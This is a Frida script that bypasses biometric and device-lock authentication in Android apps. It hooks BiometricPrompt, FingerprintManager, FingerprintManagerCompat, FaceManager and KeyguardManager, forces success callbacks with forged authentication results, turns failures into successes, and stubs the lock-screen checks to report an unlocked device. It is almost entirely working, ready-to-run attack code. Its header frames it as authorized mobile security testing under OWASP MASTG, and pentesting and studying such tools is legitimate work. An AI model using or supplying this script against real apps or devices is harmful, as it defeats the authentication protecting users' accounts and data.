/**
 * Universal Biometric Authentication Bypass - Production Ready v1.1
 *
 * Credits:
 * - ax/android-fingerprint-bypass (https://github.com/ax/android-fingerprint-bypass)
 * - Dynamic constructor resolution for any Android version
 * - WithSecureLABS/android-keystore-audit (https://github.com/ReversecLabs/android-keystore-audit)
 * - Crypto-object binding bypass via exception handling
 * - FriList/android-biometric-bypass-android11 (https://github.com/rsenet/FriList)
 * - Manual bypass() function for apps validating crypto operations
 *
 * Purpose: Universal biometric authentication bypass for Android applications
 * Supports: BiometricPrompt (Android 9+), FingerprintManager, FingerprintManagerCompat,
 *          FaceManager (Android 10+), KeyguardManager
 *
 * Note: IrisManager removed - not available in AOSP
 *
 * Usage:
 *   frida -U -f <package_name> -l biometric-bypass.js
 *   or
 *   frida -U <package_name> -l biometric-bypass.js
 *
 * For apps with crypto-object validation:
 *   After triggering biometric prompt, call: bypass()
 *
 * OWASP MASTG References:
 * - MASTG-TEST-0018: Test Local Authentication
 * - MASWE-0044: Weak Local Authentication Mechanism
 *
 * Note: This is for security testing purposes only.
 * Always obtain proper authorization before testing.
 */

Java.perform(function() {
    console.log("[*] ==================================================");
    console.log("[*] Universal Biometric Bypass v1.1 - Production Ready");
    console.log("[*] ==================================================");
    console.log("[*] Credits: ax, WithSecureLABS, FriList");
    console.log("[*] ==================================================");

    // ========================================
    // CONFIGURATION
    // ========================================
    var CONFIG = {
        // Auto-trigger success without user interaction
        autoTrigger: true,

        // Log all biometric attempts
        verboseLogging: true,

        // Bypass Keyguard (PIN/pattern) checks
        bypassKeyguard: true,

        // Handle crypto-object bound authentication
        handleCryptoObject: true,

        // Bypass crypto validation via exception handling
        bypassCryptoValidation: true,

        // Store callback for manual bypass() function
        storeCallback: true
    };

    // ========================================
    // GLOBAL STATE
    // ========================================
    var callbackG = null;
    var authenticationResultInst = null;
    var authResultConstructorResolved = false;

    // ========================================
    // UTILITY FUNCTIONS
    // ========================================
    function log(prefix, message) {
        if (CONFIG.verboseLogging) {
            console.log(prefix + " " + message);
        }
    }

    function logSuccess(what) {
        console.log("[+] " + what);
    }

    function logError(what) {
        console.log("[!] " + what);
    }

    function logBypass(type) {
        console.log("[BYPASS] " + type);
    }

    // ========================================
    // DYNAMIC CONSTRUCTOR RESOLUTION (from ax)
    // ========================================
    function getAuthResult(resultObj, cryptoInst) {
        // Try multiple constructor signatures in order of preference
        try {
            var authResult = resultObj.$new(cryptoInst, null, 0, false);
            log("[CONSTRUCTOR]", "Using signature: (CryptoObject, Object, int, boolean)");
            return authResult;
        } catch (e) {
            console.log("[!] Error: " + e);
        }

        try {
            var authResult = resultObj.$new(cryptoInst, null, 0);
            log("[CONSTRUCTOR]", "Using signature: (CryptoObject, Object, int)");
            return authResult;
        } catch (e) {
            console.log("[!] Error: " + e);
        }

        try {
            var authResult = resultObj.$new(cryptoInst, null);
            log("[CONSTRUCTOR]", "Using signature: (CryptoObject, Object)");
            return authResult;
        } catch (e) {
            console.log("[!] Error: " + e);
        }

        try {
            var authResult = resultObj.$new(cryptoInst, 0);
            log("[CONSTRUCTOR]", "Using signature: (CryptoObject, int)");
            return authResult;
        } catch (e) {
            console.log("[!] Error: " + e);
        }

        try {
            var authResult = resultObj.$new(cryptoInst);
            log("[CONSTRUCTOR]", "Using signature: (CryptoObject)");
            return authResult;
        } catch (e) {
            console.log("[!] Error: " + e);
        }

        logError("Could not resolve AuthenticationResult constructor!");
        return null;
    }

    function getBiometricPromptAuthResult() {
        // Note: For biometric bypass, passing null to CryptoObject is often intentional
        // This disables crypto-bound authentication, allowing bypass without proper key validation
        // If you need a real Cipher instance (for testing crypto operations), use:
        // var Cipher = Java.use('javax.crypto.Cipher');
        // var sweet_cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        var sweet_cipher = null;
        var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
        var cryptoInst = cryptoObj.$new(sweet_cipher);
        var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
        var authResult = getAuthResult(authenticationResultObj, cryptoInst);

        if (authResult) {
            log("[CRYPTO]", "Created AuthenticationResult with CryptoObject: " + cryptoInst);
        }

        return authResult;
    }

    function getFingerprintManagerAuthResult(authResultClass, cryptoObjClass) {
        // Note: For biometric bypass, passing null to CryptoObject is often intentional
        // This disables crypto-bound authentication, allowing bypass without proper key validation
        // If you need a real Cipher instance (for testing crypto operations), use:
        // var Cipher = Java.use('javax.crypto.Cipher');
        // var sweet_cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        var sweet_cipher = null;
        var cryptoInst = cryptoObjClass.$new(sweet_cipher);
        var authResult = getAuthResult(authResultClass, cryptoInst);

        if (authResult) {
            log("[CRYPTO]", "Created AuthenticationResult with CryptoObject: " + cryptoInst);
        }

        return authResult;
    }

    // ========================================
    // CRYPTO VALIDATION BYPASS (exception handling)
    // ========================================
    if (CONFIG.bypassCryptoValidation) {
        hookCipherOperations();
    }

    function hookCipherOperations() {
        try {
            var Cipher = Java.use('javax.crypto.Cipher');

            // Hook all doFinal overloads
            ['doFinal'].forEach(function(method) {
                var overloads = Cipher[method].overloads;
                for (var i = 0; i < overloads.length; i++) {
                    try {
                        overloads[i].implementation = function() {
                            try {
                                return this[method].apply(this, arguments);
                            } catch (error) {
                                var errorStr = error.toString();
                                if (errorStr.indexOf('IllegalBlockSizeException') !== -1) {
                                    logBypass("Cipher.doFinal() - Crypto validation bypassed via exception handling");
                                }
                                throw error;
                            }
                        };
                        logSuccess("Hooked Cipher." + method + " overload " + i);
                    } catch (e) {
                        console.log("[!] Error: " + e);
                    }
                }
            });

            // Hook all update overloads
            ['update'].forEach(function(method) {
                var overloads = Cipher[method].overloads;
                for (var i = 0; i < overloads.length; i++) {
                    try {
                        overloads[i].implementation = function() {
                            try {
                                return this[method].apply(this, arguments);
                            } catch (error) {
                                var errorStr = error.toString();
                                if (errorStr.indexOf('IllegalBlockSizeException') !== -1) {
                                    logBypass("Cipher.update() - Crypto validation bypassed via exception handling");
                                }
                                throw error;
                            }
                        };
                        logSuccess("Hooked Cipher." + method + " overload " + i);
                    } catch (e) {
                        console.log("[!] Error: " + e);
                    }
                }
            });
        } catch (e) {
            logError("Failed to hook Cipher operations: " + e);
        }
    }

    // ========================================
    // MANUAL BYPASS FUNCTION
    // ========================================
    rpc.exports = {
        bypass: function() {
            Java.perform(function() {
                if (!callbackG || !authenticationResultInst) {
                    logError("No biometric callback stored. Trigger authentication first.");
                    return false;
                }

                try {
                    var Runnable = Java.use('java.lang.Runnable');
                    var Runner = Java.registerClass({
                        name: 'com.bypass.ManualBypassRunner',
                        implements: [Runnable],
                        methods: {
                            run: function() {
                                try {
                                    logBypass("Manual bypass() called - triggering onAuthenticationSucceeded()");
                                    callbackG.onAuthenticationSucceeded(authenticationResultInst);
                                    logSuccess("Manual bypass successful!");
                                } catch (error) {
                                    logError("Manual bypass failed: " + error);
                                }
                            }
                        }
                    });

                    var Handler = Java.use('android.os.Handler');
                    var Looper = Java.use('android.os.Looper');
                    var loop = Looper.getMainLooper();
                    var handler = Handler.$new(loop);
                    handler.post(Runner.$new());

                    return true;
                } catch (e) {
                    logError("Failed to execute manual bypass: " + e);
                    return false;
                }
            });
        },
        status: function() {
            return {
                hasCallback: callbackG !== null,
                hasResult: authenticationResultInst !== null,
                config: CONFIG
            };
        }
    };

    // ========================================
    // ANDROIDX.BIOMETRIC.BIOMETRICPROMPT (Modern API)
    // ========================================
    try {
        var BiometricPromptX = Java.use("androidx.biometric.BiometricPrompt");
        var AuthenticationCallbackX = BiometricPromptX.AuthenticationCallback;

        // Hook onAuthenticationSucceeded
        AuthenticationCallbackX.onAuthenticationSucceeded.implementation = function(result) {
            logSuccess("BiometricPromptX.onAuthenticationSucceeded() called");
            log("[RESULT]", "Authentication Result: " + result);
            return this.onAuthenticationSucceeded(result);
        };

        // Hook onAuthenticationFailed - bypass
        AuthenticationCallbackX.onAuthenticationFailed.implementation = function() {
            logBypass("BiometricPromptX.onAuthenticationFailed() BLOCKED");
            log("[BYPASS]", "Converting failure to success");

            if (CONFIG.autoTrigger) {
                try {
                    var resultClass = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
                    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
                    var cryptoInst = cryptoObj.$new(null);
                    var dummyResult = getAuthResult(resultClass, cryptoInst);
                    if (dummyResult) {
                        this.onAuthenticationSucceeded(dummyResult);
                        logSuccess("Auto-bypass successful for BiometricPromptX");
                    }
                } catch (e) {
                    logError("Error creating dummy result (androidx): " + e);
                }
            }
        };

        // Hook onAuthenticationError
        AuthenticationCallbackX.onAuthenticationError.implementation = function(errorCode, errString) {
            logError("BiometricPromptX.onAuthenticationError(): " + errorCode + " - " + errString);

            if (CONFIG.autoTrigger) {
                try {
                    var resultClass = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
                    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
                    var cryptoInst = cryptoObj.$new(null);
                    var dummyResult = getAuthResult(resultClass, cryptoInst);
                    if (dummyResult) {
                        this.onAuthenticationSucceeded(dummyResult);
                        logBypass("Auto-bypassed error for BiometricPromptX");
                    }
                } catch (e) {
                    console.log("[!] Error: " + e);
                }
            }
            return this.onAuthenticationError(errorCode, errString);
        };

        logSuccess("androidx.biometric.BiometricPrompt hooked");
    } catch (e) {
        logError("androidx.biometric.BiometricPrompt not found: " + e);
    }

    // ========================================
    // HARDWARE.BIOMETRICS.BIOMETRICPROMPT (Android 28+)
    // ========================================
    try {
        hookBiometricPromptHW();
        logSuccess("android.hardware.biometrics.BiometricPrompt hooked");
    } catch (e) {
        logError("android.hardware.biometrics.BiometricPrompt not found: " + e);
    }

    function hookBiometricPromptHW() {
        var BiometricPromptHW = Java.use('android.hardware.biometrics.BiometricPrompt');

        // Hook authenticate method - 3 param overload
        try {
            BiometricPromptHW.authenticate.overload(
                'android.os.CancellationSignal',
                'java.util.concurrent.Executor',
                'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
            ).implementation = function(cancellationSignal, executor, callback) {
                logSuccess("BiometricPromptHW.authenticate() called (3-param)");
                log("[ARGS]", "CancellationSignal: " + cancellationSignal + ", Callback: " + callback);

                var authResultInst = getBiometricPromptAuthResult();

                if (authResultInst && CONFIG.autoTrigger) {
                    logBypass("Auto-triggering success callback");
                    var successRunnableClass = "com.bypass.SuccessRunnable_" + Math.random().toString(36).substr(2, 9);
                    executor.execute(Java.registerClass({
                        name: successRunnableClass,
                        implements: [Java.use('java.lang.Runnable')],
                        methods: {
                            run: function() {
                                try {
                                    callback.onAuthenticationSucceeded(authResultInst);
                                    logSuccess("Success callback triggered");
                                } catch (e) {
                                    logError("Error triggering success: " + e);
                                }
                            }
                        }
                    }).$new());
                    return;
                }

                return this.authenticate(cancellationSignal, executor, callback);
            };
        } catch (e) {
            console.log("[!] Error: " + e);
        }

        // Hook authenticate method - 4 param overload (with CryptoObject)
        try {
            BiometricPromptHW.authenticate.overload(
                'android.hardware.biometrics.BiometricPrompt$CryptoObject',
                'android.os.CancellationSignal',
                'java.util.concurrent.Executor',
                'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
            ).implementation = function(crypto, cancellationSignal, executor, callback) {
                logSuccess("BiometricPromptHW.authenticate() called (4-param with CryptoObject)");
                log("[ARGS]", "Crypto: " + crypto + ", CancellationSignal: " + cancellationSignal);

                if (CONFIG.storeCallback) {
                    callbackG = Java.retain(callback);
                    authenticationResultInst = getBiometricPromptAuthResult();
                }

                if (CONFIG.autoTrigger) {
                    if (authenticationResultInst) {
                        var successRunnableClass2 = "com.bypass.SuccessRunnable2_" + Math.random().toString(36).substr(2, 9);
                        executor.execute(Java.registerClass({
                            name: successRunnableClass2,
                            implements: [Java.use('java.lang.Runnable')],
                            methods: {
                                run: function() {
                                    try {
                                        callback.onAuthenticationSucceeded(authenticationResultInst);
                                        logBypass("Crypto-object bound auth bypassed");
                                        logSuccess("Success callback triggered");
                                    } catch (e) {
                                        logError("Error triggering success: " + e);
                                    }
                                }
                            }
                        }).$new());
                    }
                    return;
                }

                return this.authenticate(crypto, cancellationSignal, executor, callback);
            };
        } catch (e) {
            console.log("[!] Error: " + e);
        }
    }

    // ========================================
    // FINGERPRINTMANAGERCOMPAT (Legacy API)
    // ========================================
    try {
        hookFingerprintManagerCompat();
        logSuccess("FingerprintManagerCompat hooked");
    } catch (e) {
        logError("FingerprintManagerCompat not found: " + e);
    }

    function hookFingerprintManagerCompat() {
        var FingerprintManagerCompat = null;
        var cryptoObj = null;
        var authResultClass = null;

        // Try support library first, then androidx
        try {
            FingerprintManagerCompat = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat');
            cryptoObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
            authResultClass = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
        } catch (e) {
            try {
                FingerprintManagerCompat = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat');
                cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
                authResultClass = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
            } catch (e2) {
                logError("FingerprintManagerCompat class not found!");
                return;
            }
        }

        var authMethod = FingerprintManagerCompat.authenticate;
        authMethod.implementation = function(crypto, flags, cancel, callback, handler) {
            logSuccess("FingerprintManagerCompat.authenticate() called");
            log("[ARGS]", "Crypto: " + crypto + ", Flags: " + flags + ", Callback: " + callback);

            // Hook onAuthenticationFailed
            try {
                callback.onAuthenticationFailed.implementation = function() {
                    logBypass("FingerprintManagerCompat.onAuthenticationFailed() BLOCKED");

                    if (CONFIG.autoTrigger) {
                        try {
                            var authResultInst = getFingerprintManagerAuthResult(authResultClass, cryptoObj);
                            if (authResultInst) {
                                this.onAuthenticationSucceeded(authResultInst);
                                logBypass("Auto-bypassed FingerprintManagerCompat failure");
                            }
                        } catch (e) {
                            logError("Error creating dummy result (compat): " + e);
                        }
                    }
                };
            } catch (e) {
                console.log("[!] Error: " + e);
            }

            if (CONFIG.storeCallback) {
                callbackG = Java.retain(callback);
                authenticationResultInst = getFingerprintManagerAuthResult(authResultClass, cryptoObj);
            }

            return this.authenticate(crypto, flags, cancel, callback, handler);
        };
    }

    // ========================================
    // FINGERPRINTMANAGER (Legacy API - Pre-Android 9)
    // ========================================
    try {
        hookFingerprintManager();
        logSuccess("FingerprintManager hooked");
    } catch (e) {
        logError("FingerprintManager not found: " + e);
    }

    function hookFingerprintManager() {
        var FingerprintManager = null;
        var cryptoObj = null;
        var authResultClass = null;

        try {
            FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
            cryptoObj = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
            authResultClass = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
        } catch (e) {
            try {
                FingerprintManager = Java.use('androidx.core.hardware.fingerprint.FingerprintManager');
                cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$CryptoObject');
                authResultClass = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$AuthenticationResult');
            } catch (e2) {
                logError("FingerprintManager class not found!");
                return;
            }
        }

        // Hook authenticate - multiple overloads
        try {
            FingerprintManager.authenticate.overload(
                'android.hardware.fingerprint.FingerprintManager$CryptoObject',
                'android.os.CancellationSignal',
                'int',
                'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
                'android.os.Handler'
            ).implementation = function(crypto, cancel, flags, callback, handler) {
                logSuccess("FingerprintManager.authenticate() called");
                log("[ARGS]", "Crypto: " + crypto + ", Flags: " + flags + ", Callback: " + callback);

                if (CONFIG.storeCallback) {
                    callbackG = Java.retain(callback);
                    authenticationResultInst = getFingerprintManagerAuthResult(authResultClass, cryptoObj);
                }

                if (CONFIG.autoTrigger && authenticationResultInst) {
                    callback.onAuthenticationSucceeded(authenticationResultInst);
                    logBypass("Auto-bypassed FingerprintManager auth");
                    return;
                }

                return this.authenticate(crypto, cancel, flags, callback, handler);
            };
        } catch (e) {
            console.log("[!] Error: " + e);
        }
    }

    // ========================================
    // FACEMANAGER (Android 10+)
    // ========================================
    try {
        var FaceManager = Java.use("android.hardware.face.FaceManager");
        var FaceAuthCallback = FaceManager.AuthenticationCallback;

        FaceAuthCallback.onAuthenticationSucceeded.implementation = function(result) {
            logSuccess("FaceManager.onAuthenticationSucceeded() called");
            return this.onAuthenticationSucceeded(result);
        };

        FaceAuthCallback.onAuthenticationFailed.implementation = function() {
            logBypass("FaceManager.onAuthenticationFailed() BLOCKED");

            if (CONFIG.autoTrigger) {
                try {
                    var resultClass = Java.use("android.hardware.face.FaceManager$AuthenticationResult");
                    var cryptoInst = Java.use("android.hardware.face.FaceManager$CryptoObject").$new(null);
                    var dummyResult = resultClass.$new(cryptoInst, null, 0);
                    this.onAuthenticationSucceeded(dummyResult);
                    logBypass("Auto-bypassed FaceManager auth");
                } catch (e) {
                    logError("Error creating dummy result (face): " + e);
                }
            }
        };

        logSuccess("FaceManager hooked (Android 10+)");
    } catch (e) {
        logError("FaceManager not found (Android 10+ only): " + e);
    }

    // ========================================
    // KEYGUARD MANAGER (PIN/Pattern Lock)
    // ========================================
    if (CONFIG.bypassKeyguard) {
        try {
            var KeyguardManager = Java.use("android.app.KeyguardManager");

            KeyguardManager.isDeviceLocked.implementation = function() {
                logBypass("KeyguardManager.isDeviceLocked() -> bypassing (false)");
                return false;
            };

            KeyguardManager.isKeyguardSecure.implementation = function() {
                logBypass("KeyguardManager.isKeyguardSecure() -> bypassing (false)");
                return false;
            };

            KeyguardManager.inKeyguardRestrictedInputMode.implementation = function() {
                logBypass("KeyguardManager.inKeyguardRestrictedInputMode() -> bypassing (false)");
                return false;
            };

            // Hook createConfirmDeviceCredentialIntent
            KeyguardManager.createConfirmDeviceCredentialIntent.overload(
                'java.lang.CharSequence', 'java.lang.CharSequence'
            ).implementation = function(title, description) {
                logBypass("KeyguardManager.createConfirmDeviceCredentialIntent() -> bypassing (null)");
                log("[ARGS]", "Title: " + title + ", Description: " + description);
                return null;
            };

            KeyguardManager.createConfirmDeviceCredentialIntent.overload(
                'java.lang.CharSequence', 'java.lang.CharSequence', 'int'
            ).implementation = function(title, description, flags) {
                logBypass("KeyguardManager.createConfirmDeviceCredentialIntent(flags) -> bypassing (null)");
                return null;
            };

            logSuccess("KeyguardManager hooked (PIN/pattern bypassed)");
        } catch (e) {
            logError("KeyguardManager bypass error: " + e);
        }
    }

    // ========================================
    // SUMMARY
    // ========================================
    console.log("[*] ==================================================");
    console.log("[*] Biometric Bypass Script Loaded Successfully");
    console.log("[*] ==================================================");
    console.log("[*] API Coverage:");
    console.log("[*]   - BiometricPrompt (Android 9+)");
    console.log("[*]   - androidx.biometric.BiometricPrompt");
    console.log("[*]   - FingerprintManager (legacy)");
    console.log("[*]   - FingerprintManagerCompat (legacy)");
    console.log("[*]   - FaceManager (Android 10+)");
    console.log("[*]   - KeyguardManager (PIN/pattern)");
    console.log("[*] ==================================================");
    console.log("[*] Features:");
    console.log("[*]   - Dynamic constructor resolution");
    console.log("[*]   - Crypto-object binding bypass");
    console.log("[*]   - Exception handling for crypto validation");
    console.log("[*]   - Manual bypass via bypass() RPC");
    console.log("[*]   - Auto-trigger success callback");
    console.log("[*] ==================================================");
    console.log("[*] Manual bypass:");
    console.log("[*]   For apps with crypto validation, call: bypass()");
    console.log("[*]   RPC: frida.exp.bypass()");
    console.log("[*] ==================================================");
});
